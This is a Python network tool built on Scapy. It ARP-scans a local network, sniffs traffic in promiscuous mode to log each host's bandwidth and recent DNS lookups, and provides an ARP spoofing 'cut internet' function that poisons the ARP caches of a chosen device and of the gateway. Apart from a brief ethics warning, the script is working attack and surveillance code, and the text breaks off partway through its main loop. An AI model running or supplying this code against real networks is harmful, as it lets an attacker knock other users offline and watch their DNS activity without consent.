import sys
import logging
import time
import msvcrt
import threading # Added for background sniffing
import socket # Moved import here
import os # Added for screen clearing
from collections import defaultdict, deque # Added deque for limited history
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Configure logging to suppress Scapy's verbose output
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
logging.getLogger("scapy.interactive").setLevel(logging.ERROR)
logging.getLogger("scapy.loading").setLevel(logging.ERROR)

try:
    from scapy.all import ARP, Ether, srp, send, get_if_list, conf, sniff, IP, UDP, DNS, DNSQR # Added send, UDP, DNS, DNSQR
except ImportError:
    print("Scapy library is not installed. Please install it using: pip install scapy")
    sys.exit(1)

# --- Globals --- 
bandwidth_lock = threading.Lock()
# Stores {ip: bytes}
upload_usage = defaultdict(int)
download_usage = defaultdict(int)
# Stores {ip: deque([domain1, domain2, ...])}
dns_queries = defaultdict(lambda: deque(maxlen=10)) # Store last 10 unique queries per IP
# Keep track of known local IPs from the last scan
known_ips = set()
stop_sniffing_event = threading.Event()
# --- ARP Spoofing Globals ---
spoofing_target = None # Dictionary {'ip': target_ip, 'mac': target_mac}
spoofing_thread = None
spoof_stop_event = threading.Event()
gateway_ip = None
gateway_mac = None
# --- Need local IP for display/target check ---
local_ip_on_iface = None 
# ---------------------------------------------
# ---------------------------

def get_gateway_ip():
    """Gets the default gateway IP address."""
    try:
        # Use Scapy's route information
        gateway = conf.route.route("0.0.0.0")[2] # Index 2 is the gateway IP
        if gateway and gateway != '0.0.0.0':
            print(f"{Style.BRIGHT}{Fore.GREEN}[*]{Style.RESET_ALL} Found gateway IP: {Fore.CYAN}{gateway}{Style.RESET_ALL}")
            return gateway
        else:
            raise ValueError("Could not determine gateway from Scapy routes.")
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[!]{Style.RESET_ALL} Error getting gateway IP: {e}")
        print(f"{Style.BRIGHT}{Fore.YELLOW}[i]{Style.RESET_ALL} Attempting fallback method...")
        # Fallback: Try parsing 'ipconfig' or 'route print' (Windows specific)
        # This is less reliable and might need adjustments
        try:
            import subprocess
            result = subprocess.run(['ipconfig'], capture_output=True, text=True, check=True)
            for line in result.stdout.splitlines():
                if 'Default Gateway' in line:
                    parts = line.split(':')
                    if len(parts) > 1:
                        gw = parts[1].strip()
                        if gw and gw != '0.0.0.0': # Check if a valid IP is found
                             print(f"{Style.BRIGHT}{Fore.GREEN}[*]{Style.RESET_ALL} Found gateway IP (fallback): {Fore.CYAN}{gw}{Style.RESET_ALL}")
                             return gw
            raise ValueError("Gateway not found in ipconfig output.")
        except (subprocess.CalledProcessError, FileNotFoundError, ValueError) as fallback_e:
            print(f"{Style.BRIGHT}{Fore.RED}[!]{Style.RESET_ALL} Fallback failed: {fallback_e}")
            print(f"{Style.BRIGHT}{Fore.RED}[!]{Style.RESET_ALL} Could not determine gateway IP. ARP spoofing will not work.")
            return None

def get_mac(ip_address, interface):
    """Gets the MAC address for a given IP address using ARP."""
    try:
        # Send ARP request to get MAC address
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, iface=interface, verbose=False)
        if ans:
            return ans[0][1].hwsrc # Return MAC from the first response
        else:
            print(f"{Style.BRIGHT}{Fore.YELLOW}[w]{Style.RESET_ALL} Could not resolve MAC address for {ip_address}. Maybe offline?")
            return None
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[!]{Style.RESET_ALL} Error getting MAC for {ip_address}: {e}")
        return None

def spoof(target_ip, target_mac, spoof_ip, interface):
    """Sends one ARP spoof packet to the target."""
    # op=2 means ARP reply (is-at)
    # pdst = target IP, hwdst = target MAC
    # psrc = IP we are pretending to be (gateway or other host)
    # hwsrc = Our MAC address (Scapy fills this by default if not specified)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    try:
        send(packet, iface=interface, verbose=False)
    except Exception as e:
        # Avoid flooding console if send fails repeatedly
        # Consider adding a counter or flag to limit error messages
        # print(f"Error sending spoof packet: {e}")
        pass # Fail silently for now in the loop

def restore(destination_ip, destination_mac, source_ip, source_mac, interface):
    """Restores the ARP tables by sending correct ARP packets."""
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    try:
        send(packet, count=4, iface=interface, verbose=False) # Send multiple times for reliability
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[!]{Style.RESET_ALL} Error sending restore packet to {destination_ip}: {e}")

def arp_spoof_thread(target_ip, target_mac, gateway_ip, gateway_mac, interface):
    """Continuously sends ARP spoof packets to target and gateway."""
    global spoof_stop_event
    print(f"{Style.BRIGHT}{Fore.RED}[!] Starting ARP spoof against {target_ip}...{Style.RESET_ALL}")
    try:
        while not spoof_stop_event.is_set():
            # Tell the target that we are the gateway
            spoof(target_ip, target_mac, gateway_ip, interface)
            # Tell the gateway that we are the target
            spoof(gateway_ip, gateway_mac, target_ip, interface)
            # Wait before sending next batch
            time.sleep(2) # Send packets every 2 seconds
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[!]{Style.RESET_ALL} Error in ARP spoofing thread: {e}")
    finally:
        print(f"{Style.BRIGHT}{Fore.YELLOW}[*]{Style.RESET_ALL} Stopping ARP spoof against {target_ip}. Restoring ARP tables...{Style.RESET_ALL}")
        # Restore ARP tables for target and gateway
        my_mac = conf.ifaces.get(interface).mac
        if my_mac:
             restore(target_ip, target_mac, gateway_ip, gateway_mac, interface)
             restore(gateway_ip, gateway_mac, target_ip, target_mac, interface)
        else:
             print(f"{Style.BRIGHT}{Fore.RED}[!]{Style.RESET_ALL} Could not get own MAC for restore. Manual ARP cache clear might be needed on target/gateway.")
        print(f"{Style.BRIGHT}{Fore.GREEN}[*]{Style.RESET_ALL} ARP tables restored for {target_ip}.{Style.RESET_ALL}")

def start_spoofing(target_ip, target_mac, gateway_ip, gateway_mac, interface):
    """Starts the ARP spoofing thread."""
    global spoofing_thread, spoof_stop_event, spoofing_target
    if spoofing_thread and spoofing_thread.is_alive():
        print(f"{Style.BRIGHT}{Fore.YELLOW}[w]{Style.RESET_ALL} Spoofing is already running against {spoofing_target['ip']}. Stop it first.")
        return

    spoofing_target = {'ip': target_ip, 'mac': target_mac}
    spoof_stop_event.clear() # Ensure the stop event is clear before starting
    spoofing_thread = threading.Thread(target=arp_spoof_thread,
                                       args=(target_ip, target_mac, gateway_ip, gateway_mac, interface),
                                       daemon=True) # Daemon thread exits with main program
    spoofing_thread.start()

def stop_spoofing():
    """Stops the ARP spoofing thread and restores ARP tables."""
    global spoofing_thread, spoof_stop_event, spoofing_target
    if spoofing_thread and spoofing_thread.is_alive():
        print(f"{Style.BRIGHT}{Fore.YELLOW}[*]{Style.RESET_ALL} Sending stop signal to spoofing thread...{Style.RESET_ALL}")
        spoof_stop_event.set() # Signal the thread to stop
        spoofing_thread.join(timeout=5) # Wait for the thread to finish (includes restore)
        if spoofing_thread.is_alive():
             print(f"{Style.BRIGHT}{Fore.RED}[!]{Style.RESET_ALL} Spoofing thread did not stop gracefully. Restoration might be incomplete.")
        spoofing_thread = None
        spoofing_target = None
    else:
        print(f"{Style.BRIGHT}{Fore.YELLOW}[i]{Style.RESET_ALL} Spoofing is not currently active.")
        # Ensure target is cleared even if thread was already dead
        spoofing_target = None 

# ----------------------------------------

def format_bytes(size):
    """Converts bytes to a human-readable format (KB, MB, GB)."""
    power = 2**10 # 1024
    n = 0
    power_labels = {0: '', 1: 'K', 2: 'M', 3: 'G', 4: 'T'}
    while size > power and n < len(power_labels) - 1: # Prevent index error if size is huge
        size /= power
        n += 1
    return f"{size:.2f} {power_labels[n]}B"

def packet_callback(packet):
    """Callback function for processing sniffed packets."""
    global upload_usage, download_usage, known_ips, dns_queries

    # --- Bandwidth Calculation --- 
    if IP in packet:
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst

        packet_size = len(packet) if hasattr(packet, '__len__') else 0

        if packet_size > 0:
            with bandwidth_lock:
                if src_ip in known_ips:
                    upload_usage[src_ip] += packet_size
                if dst_ip in known_ips:
                    download_usage[dst_ip] += packet_size

    # --- DNS Query Capture --- 
    # Check for DNS query (UDP, port 53, DNS layer with a query record)
    if packet.haslayer(DNS) and packet.haslayer(DNSQR) and packet.haslayer(UDP) and packet[UDP].dport == 53:
        # qr=0 indicates a query
        if packet[DNS].qr == 0 and IP in packet: 
            src_ip = packet[IP].src
            # Ensure qname exists and is bytes before decoding
            if hasattr(packet[DNSQR], 'qname') and isinstance(packet[DNSQR].qname, bytes):
                try:
                    queried_domain = packet[DNSQR].qname.decode('utf-8', errors='ignore') # Decode safely
                    # Only track queries originating from known local IPs
                    if src_ip in known_ips:
                        with bandwidth_lock: # Protect access to shared dns_queries
                            # Add to deque only if not already the most recent entry
                            if not dns_queries[src_ip] or dns_queries[src_ip][-1] != queried_domain:
                                dns_queries[src_ip].append(queried_domain)
                except Exception as e:
                    # Log potential decoding or other errors quietly
                    # print(f"Error processing DNS query: {e}") # Optional: for debugging
                    pass


def start_sniffing(interface):
    """Starts the packet sniffer in a separate thread."""
    print(f"{Style.BRIGHT}{Fore.GREEN}[*]{Style.RESET_ALL} Starting packet sniffer (Bandwidth & DNS)...{Style.RESET_ALL}")
    try:
        # Filter for IP traffic for bandwidth and UDP port 53 for DNS
        # Note: This BPF filter might slightly impact performance vs. no filter,
        # but significantly reduces packets processed by the callback.
        # It captures all IP for bandwidth, and specifically UDP 53 for DNS check.
        # We still need the python check `if packet.haslayer(DNS)` etc.
        # because other UDP 53 traffic might exist.
        # Removed BPF filter to potentially capture more traffic
        sniff(iface=interface, prn=packet_callback, store=0, 
              stop_filter=lambda p: stop_sniffing_event.is_set(),
              # filter=bpf_filter, # Removed filter
              promisc=True) # Enable promiscuous mode
    except OSError as e:
         # Handle potential "Network is down" or interface issues gracefully
         print(f"\n{Style.BRIGHT}{Fore.RED}[!]{Style.RESET_ALL} Error starting sniffer on interface {interface}: {e}")
         print(f"{Style.BRIGHT}{Fore.YELLOW}[*]{Style.RESET_ALL} Packet sniffing failed to start.")
         # Signal main thread if necessary, or just let the thread exit
         stop_sniffing_event.set() # Ensure main loop knows sniffer isn't running
    except Exception as e:
        print(f"\n{Style.BRIGHT}{Fore.RED}[!]{Style.RESET_ALL} An unexpected error occurred in the sniffer thread: {e}")
        stop_sniffing_event.set()
    finally:
        # This print might be confusing if sniffer failed to start
        if not stop_sniffing_event.is_set(): # Only print if stopped normally
             print(f"{Style.BRIGHT}{Fore.YELLOW}[*]{Style.RESET_ALL} Packet sniffer stopped.{Style.RESET_ALL}")


def get_local_ip_range():
    """Attempts to determine the local IP range (e.g., 192.168.1.0/24)."""
    # This is a basic attempt; more robust methods might be needed for complex networks
    # import socket # Moved to top
    try:
        # Connect to an external host to find the local IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Set a timeout to prevent hanging
        s.settimeout(1)
        try:
            s.connect(("8.8.8.8", 80)) # Google DNS as target
            local_ip = s.getsockname()[0]
        except socket.gaierror: # Handle case where DNS resolution fails
             s.connect(("1.1.1.1", 80)) # Cloudflare DNS as fallback
             local_ip = s.getsockname()[0]
        finally:
            s.close()

        # Assume a /24 subnet mask, common for home networks
        ip_parts = local_ip.split('.')
        if len(ip_parts) == 4:
            ip_range = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.0/24"
            print(f"{Style.BRIGHT}{Fore.GREEN}[*]{Style.RESET_ALL} Determined local IP range: {Fore.CYAN}{ip_range}{Style.RESET_ALL}")
            return ip_range
        else:
             raise ValueError("Failed to parse local IP address.")
    except (socket.error, OSError, ValueError) as e: # Catch socket errors, OS errors (like network unreachable), and ValueErrors
        print(f"{Style.BRIGHT}{Fore.RED}[!]{Style.RESET_ALL} Could not automatically determine local IP range: {e}")
        print(f"{Style.BRIGHT}{Fore.YELLOW}[!]{Style.RESET_ALL} Please specify the target IP range manually (e.g., 192.168.1.0/24).")
        return None

def list_interfaces():
    """Lists available network interfaces."""
    print(f"{Style.BRIGHT}{Fore.GREEN}[*]{Style.RESET_ALL} Available network interfaces:")
    interfaces = get_if_list()
    valid_interfaces = []
    for i, iface_name in enumerate(interfaces):
        try:
            # Attempt to get details, might fail on some virtual interfaces
            iface_details = conf.ifaces.get(iface_name)
            # Check if the interface has a usable IP address (basic check)
            if iface_details and hasattr(iface_details, 'ip') and iface_details.ip and iface_details.ip != '0.0.0.0':
                print(f"  {Fore.YELLOW}{i}{Style.RESET_ALL}: {Fore.CYAN}{iface_name}{Style.RESET_ALL} (IP: {iface_details.ip}, MAC: {iface_details.mac})")
                valid_interfaces.append(iface_name) # Add to list of selectable interfaces
            else:
                 # Optionally print interfaces without usable IPs, but don't list them for selection
                 # print(f"  {Fore.LIGHTBLACK_EX}{i}{Style.RESET_ALL}: {Fore.LIGHTBLACK_EX}{iface_name}{Style.RESET_ALL} (No usable IP or details)")
                 pass # Skip interfaces without IP/details for selection
        except Exception as e:
             print(f"  {Fore.YELLOW}{i}{Style.RESET_ALL}: {Fore.CYAN}{iface_name}{Style.RESET_ALL} ({Fore.RED}Error retrieving details: {e}{Style.RESET_ALL})")
    # Return only the interfaces that were printed with details
    # Re-index the valid interfaces for user selection
    print(f"\n{Style.BRIGHT}{Fore.GREEN}[*]{Style.RESET_ALL} Selectable interfaces:")
    selectable_map = {}
    for idx, name in enumerate(valid_interfaces):
        print(f"  {Fore.YELLOW}{idx}{Style.RESET_ALL}: {Fore.CYAN}{name}{Style.RESET_ALL}")
        selectable_map[idx] = name

    if not selectable_map:
        print(f"{Style.BRIGHT}{Fore.RED}[!]{Style.RESET_ALL} No suitable network interfaces found for scanning.")
        return None, {} # Return None and empty map

    return valid_interfaces, selectable_map # Return the original list and the map for selection

def select_interface(interfaces, selectable_map):
    """Prompts the user to select an interface from the filtered list."""
    if not interfaces or not selectable_map:
        return None # No interfaces to select

    while True:
        try:
            choice = input(f"{Style.BRIGHT}{Fore.GREEN}[*]{Style.RESET_ALL} Enter the number of the interface to use for scanning: ")
            index = int(choice)
            if index in selectable_map:
                selected_iface = selectable_map[index]
                print(f"{Style.BRIGHT}{Fore.GREEN}[*]{Style.RESET_ALL} Using interface: {Fore.CYAN}{selected_iface}{Style.RESET_ALL}")
                # Find the actual Scapy interface object if needed later, though name is often sufficient
                # selected_iface_obj = conf.ifaces.get(selected_iface)
                return selected_iface # Return the name
            else:
                print(f"{Style.BRIGHT}{Fore.RED}[!]{Style.RESET_ALL} Invalid choice. Please enter a number from the selectable list.")
        except ValueError:
            print(f"{Style.BRIGHT}{Fore.RED}[!]{Style.RESET_ALL} Invalid input. Please enter a number.")
        except KeyboardInterrupt:
            print(f"\n{Style.BRIGHT}{Fore.YELLOW}[!]{Style.RESET_ALL} Scan aborted by user.")
            sys.exit(0)

def arp_scan(ip_range, interface):
    """Performs an ARP scan and updates the known IPs set."""
    global known_ips
    print(f"{Style.BRIGHT}{Fore.GREEN}[*]{Style.RESET_ALL} Scanning network: {Fore.CYAN}{ip_range}{Style.RESET_ALL}...")
    clients = []
    current_scan_ips = set()
    try:
        # Create an ARP request packet
        arp_request = ARP(pdst=ip_range)
        # Create an Ethernet frame
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        # Combine the Ethernet frame and ARP request
        arp_request_broadcast = broadcast / arp_request

        # Send the packet and capture responses
        # timeout=3 increased timeout
        # verbose=False suppresses Scapy's output during sending
        # iface=interface specifies the network interface to use
        answered_list, unanswered_list = srp(arp_request_broadcast, timeout=3, iface=interface, verbose=False)

        if not answered_list:
             print(f"{Style.BRIGHT}{Fore.YELLOW}[i]{Style.RESET_ALL} No devices responded to ARP scan.")


        for sent, received in answered_list:
            client_ip = received.psrc
            client_mac = received.hwsrc
            clients.append({'ip': client_ip, 'mac': client_mac})
            current_scan_ips.add(client_ip)

        # Update the global set of known IPs for the sniffer
        with bandwidth_lock:
            known_ips = current_scan_ips
            # Optional: Reset usage for IPs no longer detected?
            # Or keep historical data? For now, keep it.

        return clients
    except PermissionError:
        print(f"{Style.BRIGHT}{Fore.RED}[!]{Style.RESET_ALL} Permission denied. Please run this script with administrator privileges.")
        sys.exit(1)
    except OSError as e:
         # Handle specific OS errors like "Network is down" if srp fails
         print(f"{Style.BRIGHT}{Fore.RED}[!]{Style.RESET_ALL} Network error during scan on interface {interface}: {e}")
         return [] # Return empty list on network error
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[!]{Style.RESET_ALL} An error occurred during the ARP scan: {e}")
        # Optionally log the full traceback here for debugging
        # import traceback
        # traceback.print_exc()
        return [] # Return empty list on other errors


def print_results(clients_list):
    """Prints the discovered IP, MAC, bandwidth usage, recent DNS queries, and spoofing status."""
    global spoofing_target, gateway_ip, local_ip_on_iface # Access globals
    if not clients_list:
        return

    print(f"\n{Style.BRIGHT}{Fore.GREEN}[*]{Style.RESET_ALL} Active hosts found:")
    # Added Status column
    header = f"{'IP Address':<15}\t{'MAC Address':<17}\t{'Sent':>10}\t{'Received':>10}\t{'Recent DNS Queries':<30}\t{'Status'}"
    print(f"{Style.BRIGHT}{Fore.WHITE}{header}{Style.RESET_ALL}")
    print(f"{Style.BRIGHT}{Fore.WHITE}{'-' * (len(header) + 15)}{Style.RESET_ALL}") # Adjust separator length

    with bandwidth_lock:
        def ip_sort_key(client):
            try:
                return socket.inet_aton(client['ip'])
            except socket.error:
                return b'\x00\x00\x00\x00'

        sorted_clients = sorted(clients_list, key=ip_sort_key)

        for client in sorted_clients:
            ip = client['ip']
            mac = client['mac']
            sent_bytes = upload_usage.get(ip, 0)
            received_bytes = download_usage.get(ip, 0)
            sent = format_bytes(sent_bytes)
            received = format_bytes(received_bytes)
            
            # Get recent DNS queries for this IP
            recent_queries = list(dns_queries.get(ip, [])) # Get list from deque
            # Display last 3 queries, comma-separated
            queries_str = ", ".join(recent_queries[-3:]) if recent_queries else "-"

            # Determine status
            status = ""
            if spoofing_target and ip == spoofing_target['ip']:
                status = f"{Fore.RED}CUT OFF{Style.RESET_ALL}"
            elif ip == gateway_ip:
                 status = f"{Fore.LIGHTBLACK_EX}Gateway{Style.RESET_ALL}"
            elif ip == local_ip_on_iface:
                 status = f"{Fore.LIGHTBLACK_EX}Self{Style.RESET_ALL}"

            # Print with DNS queries and status
            # Ensure queries_str has a fixed width for alignment
            print(f"{Fore.CYAN}{ip:<15}{Style.RESET_ALL}\t{Fore.MAGENTA}{mac:<17}{Style.RESET_ALL}\t{Fore.YELLOW}{sent:>10}{Style.RESET_ALL}\t{Fore.GREEN}{received:>10}{Style.RESET_ALL}\t{Fore.LIGHTBLUE_EX}{queries_str:<30}{Style.RESET_ALL}\t{status}")

    print(f"{Style.BRIGHT}{Fore.WHITE}{'-' * (len(header) + 15)}{Style.RESET_ALL}") # Adjust separator length

if __name__ == "__main__":
    # --- Add Warning ---
    print(f"{Style.BRIGHT}{Fore.RED}--- WARNING ---{Style.RESET_ALL}")
    print("This tool includes ARP spoofing capabilities ('cut internet').")
    print("Using this feature on networks you do not own or have explicit permission")
    print("to test is unethical and potentially illegal. Use responsibly.")
    print(f"{Style.BRIGHT}{Fore.RED}---------------{Style.RESET_ALL}\n")
    input("Press Enter to acknowledge and continue...")
    os.system('cls' if os.name == 'nt' else 'clear')
    # -------------------

    # List interfaces returns the list and a map for selection
    all_interfaces, selectable_interface_map = list_interfaces()
    if not selectable_interface_map: # Check if the map is empty
        # Error message already printed in list_interfaces
        sys.exit(1)

    # Pass the map to the selection function
    selected_interface_name = select_interface(all_interfaces, selectable_interface_map)
    if not selected_interface_name:
        sys.exit(1) # Exit if no interface selected

    target_range = get_local_ip_range()
    if not target_range:
        # Example of manual input if auto-detection fails
        while not target_range: # Loop until valid input or Ctrl+C
             try:
                 manual_range = input(f"{Style.BRIGHT}{Fore.GREEN}[*]{Style.RESET_ALL} Enter the target IP range (e.g., 192.168.1.0/24): ").strip()
                 # Basic validation (optional but recommended)
                 if '/' in manual_range and '.' in manual_range:
                     target_range = manual_range
                 elif not manual_range: # Allow empty input to exit
                      print(f"{Style.BRIGHT}{Fore.RED}[!]{Style.RESET_ALL} No target range specified. Exiting.")
                      sys.exit(1)
                 else:
                     print(f"{Style.BRIGHT}{Fore.RED}[!]{Style.RESET_ALL} Invalid format. Please use CIDR notation (e.g., 192.168.1.0/24).")
             except KeyboardInterrupt:
                  print(f"\n{Style.BRIGHT}{Fore.YELLOW}[!]{Style.RESET_ALL} Operation cancelled by user.")
                  sys.exit(0)


    print(f"\n{Style.BRIGHT}{Fore.GREEN}[*]{Style.RESET_ALL} Initial scan...")
    discovered_hosts = arp_scan(target_range, selected_interface_name)

    # --- Add local IP to known_ips --- 
    try:
        local_ip_on_iface = conf.ifaces.get(selected_interface_name).ip
        if local_ip_on_iface and local_ip_on_iface != '0.0.0.0':
            with bandwidth_lock:
                if local_ip_on_iface not in known_ips:
                    print(f"{Style.BRIGHT}{Fore.YELLOW}[i]{Style.RESET_ALL} Adding local IP {Fore.CYAN}{local_ip_on_iface}{Style.RESET_ALL} to monitored set.")
                    known_ips.add(local_ip_on_iface)
                    # Add a dummy entry to discovered_hosts if not found by ARP, so it appears in the list
                    if not any(client['ip'] == local_ip_on_iface for client in discovered_hosts):
                         local_mac = conf.ifaces.get(selected_interface_name).mac
                         discovered_hosts.append({'ip': local_ip_on_iface, 'mac': local_mac if local_mac else '??:??:??:??:??:??'})
        else:
            print(f"{Style.BRIGHT}{Fore.YELLOW}[w]{Style.RESET_ALL} Could not get a valid IP for the selected interface ({selected_interface_name}). Local traffic might not be fully tracked.")
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[!]{Style.RESET_ALL} Error getting local IP for interface {selected_interface_name}: {e}")
    # ----------------------------------

    # --- Get Gateway Info --- 
    gateway_ip = get_gateway_ip()
    gateway_mac = None
    if gateway_ip:
        print(f"{Style.BRIGHT}{Fore.GREEN}[*]{Style.RESET_ALL} Attempting to resolve gateway MAC ({gateway_ip})...")
        gateway_mac = get_mac(gateway_ip, selected_interface_name)
        if gateway_mac:
            print(f"{Style.BRIGHT}{Fore.GREEN}[*]{Style.RESET_ALL} Gateway MAC resolved: {Fore.CYAN}{gateway_mac}{Style.RESET_ALL}")
        else:
            print(f"{Style.BRIGHT}{Fore.RED}[!]{Style.RESET_ALL} Failed to resolve gateway MAC. ARP spoofing will likely fail.")
    # ------------------------

    # --- Get Local IP (moved slightly earlier, needed for print_results status) ---
    # This was already present, just ensuring it's before the first print_results call
    try:
        local_ip_on_iface = conf.ifaces.get(selected_interface_name).ip
        if not local_ip_on_iface or local_ip_on_iface == '0.0.0.0':
             print(f"{Style.BRIGHT}{Fore.YELLOW}[w]{Style.RESET_ALL} Could not get a valid IP for the selected interface ({selected_interface_name}). Local traffic might not be fully tracked.")
             local_ip_on_iface = None # Ensure it's None if invalid
        else:
             # Add local IP to known_ips if not already there from scan
             with bandwidth_lock:
                 if local_ip_on_iface not in known_ips:
                     print(f"{Style.BRIGHT}{Fore.YELLOW}[i]{Style.RESET_ALL} Adding local IP {Fore.CYAN}{local_ip_on_iface}{Style.RESET_ALL} to monitored set.")
                     known_ips.add(local_ip_on_iface)
                     # Add a dummy entry to discovered_hosts if not found by ARP, so it appears in the list
                     if not any(client['ip'] == local_ip_on_iface for client in discovered_hosts):
                          local_mac = conf.ifaces.get(selected_interface_name).mac
                          discovered_hosts.append({'ip': local_ip_on_iface, 'mac': local_mac if local_mac else '??:??:??:??:??:??'})
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[!]{Style.RESET_ALL} Error getting local IP for interface {selected_interface_name}: {e}")
        local_ip_on_iface = None # Ensure it's None on error
    # ---------------------------------------------------------------------------

    print_results(discovered_hosts) # Initial print (may now include local IP and gateway status)

    # Start sniffing in a background thread
    # Make it a daemon so it exits when the main thread exits
    sniffer_thread = threading.Thread(target=start_sniffing, args=(selected_interface_name,), daemon=True)
    sniffer_thread.start()

    # Give the sniffer a moment to start up and potentially fail
    time.sleep(1)
    if stop_sniffing_event.is_set(): # Check if sniffer failed immediately
         print(f"{Style.BRIGHT}{Fore.RED}[!]{Style.RESET_ALL} Bandwidth monitor could not be started. Exiting.")
         sys.exit(1)


    print(f"\n{Style.BRIGHT}{Fore.GREEN}[*]{Style.RESET_ALL} Scanner running. Bandwidth monitoring active.")
    print(f"Press '{Fore.YELLOW}r{Style.RESET_ALL}' to refresh, '{Fore.YELLOW}c{Style.RESET_ALL}' to cut/uncut internet, '{Fore.YELLOW}q{Style.RESET_ALL}' to quit.")
    print(f"{Style.BRIGHT}{Fore.RED}[WARNING]{Style.RESET_ALL} ARP Spoofing (cutting internet) should only be used on networks you own or have explicit permission to test.")

    sniffer_alive = True # Assume sniffer is running initially
    last_refresh_time = time.time()
    refresh_interval = 5 # Refresh every 5 seconds
    needs_manual_refresh_display = False # Flag to control display after manual refresh

    try:
        while True:
            current_time = time.time()
            refresh_due = (current_time - last_refresh_time) >= refresh_interval

            # Check if sniffer thread died unexpectedly
            if sniffer_alive and not sniffer_thread.is_alive():
                print(f"\n{Style.BRIGHT}{Fore.RED}[!]{Style.RESET_ALL} Packet sniffer thread stopped unexpectedly.")
                sniffer_alive = False
                # Decide whether to try restarting or just inform the user
                print(f"{Style.BRIGHT}{Fore.YELLOW}[i]{Style.RESET_ALL} Bandwidth and DNS data will not be updated.")
                # Prevent continuous printing of this message
                last_refresh_time = current_time # Reset timer to avoid immediate auto-refresh

            key_pressed = None
            if msvcrt.kbhit(): # Check if a key has been pressed
                try:
                    key_pressed = msvcrt.getch().decode('utf-8').lower()
                except UnicodeDecodeError:
                    key_pressed = '' # Ignore non-decodeable keys

            if key_pressed == 'r':
                print(f"\n{Style.BRIGHT}{Fore.GREEN}[*]{Style.RESET_ALL} Refreshing host list and usage...{Style.RESET_ALL}")
                os.system('cls' if os.name == 'nt' else 'clear') # Clear screen
                discovered_hosts = arp_scan(target_range, selected_interface_name)
                print_results(discovered_hosts) # Print updated list
                print(f"\nPress '{Fore.YELLOW}r{Style.RESET_ALL}' to refresh, '{Fore.YELLOW}c{Style.RESET_ALL}' to cut/uncut internet, '{Fore.YELLOW}q{Style.RESET_ALL}' to quit.")
                if spoofing_target:
                     print(f"{Style.BRIGHT}{Fore.YELLOW}[!] Currently cutting internet for: {Fore.CYAN}{spoofing_target['ip']}{Style.RESET_ALL}")
                needs_manual_refresh_display = True # Prevent immediate auto-refresh display
                last_refresh_time = current_time # Reset timer after manual refresh

            elif key_pressed == 'c': # Cut/Uncut internet option
                os.system('cls' if os.name == 'nt' else 'clear') # Clear screen
                print_results(discovered_hosts)

                if spoofing_target:
                    print(f"\n{Style.BRIGHT}{Fore.YELLOW}[*]{Style.RESET_ALL} Internet is currently cut for: {Fore.CYAN}{spoofing_target['ip']}{Style.RESET_ALL}")
                    confirm = input(f"Do you want to restore internet for this device? (y/n): ").lower()
                    if confirm == 'y':
                        stop_spoofing()
                    else:
                        print("Operation cancelled.")
                else:
                    print(f"\n{Style.BRIGHT}{Fore.GREEN}[*]{Style.RESET_ALL} Select a device to cut internet access:")
                    # Display hosts with numbers for selection
                    host_map = {}
                    for i, client in enumerate(discovered_hosts):
                        # Don't allow targeting the gateway or self
                        if client['ip'] != gateway_ip and client['ip'] != local_ip_on_iface:
                            print(f"  {Fore.YELLOW}{i}{Style.RESET_ALL}: {Fore.CYAN}{client['ip']:<15}{Style.RESET_ALL} ({Fore.MAGENTA}{client['mac']}{Style.RESET_ALL})")
                            host_map[i] = client
                        else:
                            # Just show gateway/self, don't make it selectable
                            pass 

                    if not host_map:
                        print(f"{Style.BRIGHT}{Fore.YELLOW}[w]{Style.RESET_ALL} No other targetable devices found in the current list.")
                    else:
                        while True:
                            try:
                                choice = input("Enter the number of the device to target (or 'b' to go back): ")
                                if choice.lower() == 'b':
                                    break
                                target_index = int(choice)
                                if target_index in host_map:
                                    target_client = host_map[target_index]
                                    target_ip = target_client['ip']
                                    target_mac = target_client['mac'] # Use MAC from scan results

                                    # Ensure we have gateway MAC
                                    if not gateway_ip or not gateway_mac:
                                         print(f"{Style.BRIGHT}{Fore.RED}[!]{Style.RESET_ALL} Gateway IP or MAC not found. Cannot initiate spoofing.")
                                         break # Exit selection loop

                                    print(f"{Style.BRIGHT}{Fore.YELLOW}[*]{Style.RESET_ALL} Preparing to cut internet for {Fore.CYAN}{target_ip}{Style.RESET_ALL} ({target_mac}).")
                                    confirm = input("Are you sure? (y/n): ").lower()
                                    if confirm == 'y':
                                        # Get target MAC again just in case it changed (less likely but possible)
                                        # Use the already resolved gateway_mac
                                        refreshed_target_mac = get_mac(target_ip, selected_interface_name)
                                        if refreshed_target_mac:
                                            start_spoofing(target_ip, refreshed_target_mac, gateway_ip, gateway_mac, selected_interface_name)
                                        else:
                                            print(f"{Style.BRIGHT}{Fore.RED}[!]{Style.RESET_ALL} Failed to re-confirm MAC for {target_ip}. Aborting.")
                                    else:
                                        print("Operation cancelled.")
                                    break # Exit selection loop after action or cancellation
                                else:
                                    print(f"{Style.BRIGHT}{Fore.RED}[!]{Style.RESET_ALL} Invalid choice.")
                            except ValueError:
                                print(f"{Style.BRIGHT}{Fore.RED}[!]{Style.RESET_ALL} Invalid input. Please enter a number or 'b'.")
                            except KeyboardInterrupt:
                                print("\nOperation cancelled.")
                                break

                # Pause to see the result before loop continues/refreshes screen
                input("\nPress Enter to continue...")
                os.system('cls' if os.name == 'nt' else 'clear') # Clear screen again
                print_results(discovered_hosts) # Show results again
                print(f"\nPress '{Fore.YELLOW}r{Style.RESET_ALL}' to refresh, '{Fore.YELLOW}c{Style.RESET_ALL}' to cut/uncut internet, '{Fore.YELLOW}q{Style.RESET_ALL}' to quit.")
                if spoofing_target:
